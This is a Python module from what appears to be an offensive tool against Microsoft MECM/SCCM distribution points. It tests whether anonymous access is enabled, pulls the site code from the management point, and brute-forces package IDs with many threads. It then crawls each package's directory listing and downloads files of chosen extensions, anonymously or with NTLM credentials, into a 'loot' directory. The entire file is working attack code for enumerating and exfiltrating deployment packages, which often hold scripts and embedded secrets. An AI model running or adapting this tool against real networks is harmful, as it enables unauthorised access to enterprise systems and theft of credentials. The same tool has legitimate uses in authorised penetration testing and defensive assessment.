import os
import json
import string
import random
import urllib
import logging
import requests
import traceback
import xml.etree.ElementTree    as ET

from requests_ntlm              import HttpNtlmAuth
from multiprocessing.pool       import ThreadPool
from queue                      import Queue
from bs4                        import BeautifulSoup

from conf                       import bcolors, BRUTEFORCE_THREADS, DOWNLOAD_THREADS, ANONYMOUSDP, DP_DOWNLOAD_HEADERS, MP_INTERACTIONS_HEADERS

logger = logging.getLogger(__name__)

def checkAnonymousDPConnectionEnabled(distribution_point):
    characters = string.ascii_letters
    random_string = ''.join(random.choice(characters) for i in range(8))

    logger.info(f"[INFO] Checking anonymous DP Connection with URL {distribution_point}/sms_dp_smspkg$/{random_string}")
    r = requests.get(f"{distribution_point}/sms_dp_smspkg$/{random_string}", headers=DP_DOWNLOAD_HEADERS)
    logger.info(f"[INFO] Request returned status code {r.status_code}")
    if r.status_code == 404:
        return ANONYMOUSDP.ENABLED.value
    elif r.status_code == 401:
        return ANONYMOUSDP.DISABLED.value
    else:
        return ANONYMOUSDP.UNKNOWN.value

def checkCredentialsBeforeDownload(distribution_point, username, password):
    sess = requests.Session()
    sess.headers.update(DP_DOWNLOAD_HEADERS)
    sess.auth = HttpNtlmAuth(username, password)
    characters = string.ascii_letters
    random_string = ''.join(random.choice(characters) for i in range(8))

    logger.info(f"[INFO] Checking credentials with URL {distribution_point}/sms_dp_smspkg$/{random_string}")
    r = sess.get(f"{distribution_point}/sms_dp_smspkg$/{random_string}")
    logger.info(f"[INFO] Request returned status code {r.status_code}")
    if r.status_code == 404:
        return True
    else:
        return False


def retrieveSiteCode(management_point):
    logger.info(f"[INFO] Retrieving the MECM site code from management point")
    logger.info(f"[*] Querying MPKEYINFORMATION to extract site code from management point")
    logger.info(f"[INFO] Querying URL {management_point}/SMS_MP/.sms_aut?MPKEYINFORMATION")
    r = requests.get(f"{management_point}/SMS_MP/.sms_aut?MPKEYINFORMATION", headers=MP_INTERACTIONS_HEADERS)
    try:
        root = ET.fromstring(r.text)
    except:
        logger.info(traceback.print_exc())
        logger.info(r.text)
        logger.error(f"{bcolors.FAIL}[-] Failed to parse MECM site code from management point response{bcolors.ENDC}")
        return None

    site_code = root.find("SITECODE")
    if site_code is None:
        logger.error(f"{bcolors.FAIL}[-] Did not find expected SITECODE tag in management point response{bcolors.ENDC}")
        return None
    logger.info(f"{bcolors.OKGREEN}[+] Retrieved site code {site_code.text}{bcolors.ENDC}")
    return site_code.text


def bruteforceThreadingWrapper(pool, to_bruteforce, sessions_pool, distribution_point):
    results = {}
    
    def bruteforcePackageID(package_id):
        session = sessions_pool.get()
        try:
            r = session.get(f"{distribution_point}/sms_dp_smspkg$/{package_id}")
            if r.status_code != 200:
                return
            else:
                logger.warning(f"[*] Found package {package_id}")
                soup = BeautifulSoup(r.content, 'html.parser')
                files = []
                directories = []
                for href in soup.find_all('a'):
                    previous_sibling = href.find_previous_sibling(string=True)
                    if previous_sibling and 'dir' in previous_sibling:
                        directories.append(href.get('href'))
                    else:
                        files.append(href.get('href'))
                
                results[package_id] = {}
                for directory in directories:
                    results[package_id][directory] = {}
                for file in files:
                    results[package_id][file] = None
        finally:
            sessions_pool.put(session)

    pool.map(bruteforcePackageID, to_bruteforce)
    return results


def recursivePackageDirectoryFetch(object, directory, authenticated_session=None):
    if authenticated_session is None:
        r = requests.get(directory, headers=DP_DOWNLOAD_HEADERS)
    else:
        r = authenticated_session.get(directory)
    soup = BeautifulSoup(r.content, 'html.parser')
    files = []
    for href in soup.find_all('a'):
        previous_sibling = href.find_previous_sibling(string=True)
        if previous_sibling and 'dir' in previous_sibling:
            object[href.get('href')] = {}
            recursivePackageDirectoryFetch(object[href.get('href')], href.get('href'))
        else:
            files.append(href.get('href'))
    for file in files:
        object[file] = None


def recursiveFileExtract(data, extensions):
    to_download = []
    if isinstance(data, dict):
        for key, value in data.items():
            if value is None and key.endswith(tuple(extensions)):
                to_download.append(key)
            else:
                to_download.extend(recursiveFileExtract(data[key], extensions))
    return to_download



def downloadThreadingWrapper(pool, to_download, sessions_pool, target_directory, package):

    def download(file):
        session = sessions_pool.get()
        try:
            parsed_url = urllib.parse.urlparse(file)
            filename = urllib.parse.unquote(parsed_url.path.split('/')[-1])
            r = session.get(file)
            output_file = f"{target_directory}/{filename}"
            with open(output_file, 'wb') as f:
                f.write(r.content)
            logger.warning(f"[INFO] Package {package} - downloaded file {filename}")
        finally:
            sessions_pool.put(session)
    pool.map(download, to_download)



def downloadFilesByExtension(directory_name, extensions, username, password):
    with open(f'loot/{directory_name}/packages/index.json', 'r') as f:
        content = json.loads(f.read())
    for key, value in content.items():
        to_download = recursiveFileExtract(value, extensions)
        if len(to_download) == 0:
            continue
        if not os.path.exists(f'loot/{directory_name}/packages/{key}'):
             os.makedirs(f'loot/{directory_name}/packages/{key}')


        sessions_pool = Queue()
        for _ in range(min(BRUTEFORCE_THREADS, len(to_download))):
            sess = requests.Session()
            sess.headers.update(DP_DOWNLOAD_HEADERS)
            if username is not None and password is not None:
                sess.auth = HttpNtlmAuth(username, password)
            sessions_pool.put(sess)

        pool = ThreadPool(min(DOWNLOAD_THREADS, len(to_download)))
        downloadThreadingWrapper(pool, to_download, sessions_pool, f'loot/{directory_name}/packages/{key}', key)



def print_tree(d, out, prefix=""):
    keys = list(d.keys())
    for i, key in enumerate(keys):
        is_last = (i == len(keys) - 1)
        if isinstance(d[key], dict):
            out.write(f"{prefix}{'└── ' if is_last else '├── '}{key}/\n")
            new_prefix = f"{prefix}{'    ' if is_last else '│   '}"
            print_tree(d[key], out, new_prefix)
        else:
            out.write(f"{prefix}{'└── ' if is_last else '├── '}{key}\n")

            
def bruteforcePackageIDs(distribution_point, site_code, bruteforce_range, directory_name, known_packages, username=None, password=None):
    to_bruteforce = []
    for i in range(bruteforce_range + 1):
        hex_str = hex(i)[2:].upper().zfill(5)
        to_bruteforce.append(site_code + hex_str)

    for package in known_packages:
        if package not in to_bruteforce:
            logger.info(f"[INFO] There is a known package that we missed during bruteforce -> {package}. Adding it to queue")
            to_bruteforce.append(package)
    

    sessions_pool = Queue()
    for _ in range(min(BRUTEFORCE_THREADS, len(to_bruteforce))):
        sess = requests.Session()
        sess.headers.update(DP_DOWNLOAD_HEADERS)
        if username is not None and password is not None:
            sess.auth = HttpNtlmAuth(username, password)
        sessions_pool.put(sess)
    


    pool = ThreadPool(min(BRUTEFORCE_THREADS, len(to_bruteforce)))
    try:
        results = bruteforceThreadingWrapper(pool, to_bruteforce, sessions_pool, distribution_point)
    except:
        traceback.print_exc()
        logger.warning(f"[-] Something went wrong while bruteforcing package IDs - the distribution point may have failed to respond in time ?")

    if username is not None and password is not None:
        directory_fetch_session = sessions_pool.get()
    else:
        directory_fetch_session = None
    
    for package in results.keys():
        for item in results[package].keys():
            if isinstance(results[package][item], dict):
                recursivePackageDirectoryFetch(results[package][item], item, directory_fetch_session)
    
    if not os.path.exists(f'loot/{directory_name}/packages'):
        os.makedirs(f'loot/{directory_name}/packages')
    with open(f'loot/{directory_name}/packages/index.json', 'w') as f:
        f.write(json.dumps(results))
    with open(f'loot/{directory_name}/packages/index.txt', 'w') as out:
        print_tree(results, out)


def packageScriptDownload(distribution_point, site_code, bruteforce_range, extensions, directory_name, known_packages, anonymous, username, password):
    logger.warning(f"{bcolors.OKCYAN}\n[*] Starting package ID bruteforce (site code {site_code}, range {bruteforce_range}){bcolors.ENDC}.")
    if anonymous:
        logger.warning(f"[*] Anonymous Distribution Point connection is enabled. Dumping without authentication.")
        bruteforcePackageIDs(distribution_point, site_code, bruteforce_range, directory_name, known_packages, None, None)
        logger.warning(f"{bcolors.OKCYAN}\n[*] Starting unauthenticated file download with target extensions {extensions}{bcolors.ENDC}")
        downloadFilesByExtension(directory_name, extensions, None, None)
    else:
        result = checkCredentialsBeforeDownload(distribution_point, username, password)
        if result is not True:
            logger.warning(f"{bcolors.FAIL}[-] It seems like provided credentials do not allow to successfully authenticate to distribution point.{bcolors.ENDC}")
            logger.warning(f"{bcolors.FAIL}Potential explanations: wrong credentials ; NTLM disabled on distribution point.{bcolors.ENDC}")
            logger.warning(f"{bcolors.FAIL}Attempted username: '{username}' - attempted password: '{password}'")
            return
        bruteforcePackageIDs(distribution_point, site_code, bruteforce_range, directory_name, known_packages, username, password)
        logger.warning(f"{bcolors.OKCYAN}\n[*] Starting file download with target extensions {extensions}{bcolors.ENDC}")
        downloadFilesByExtension(directory_name, extensions, username, password)

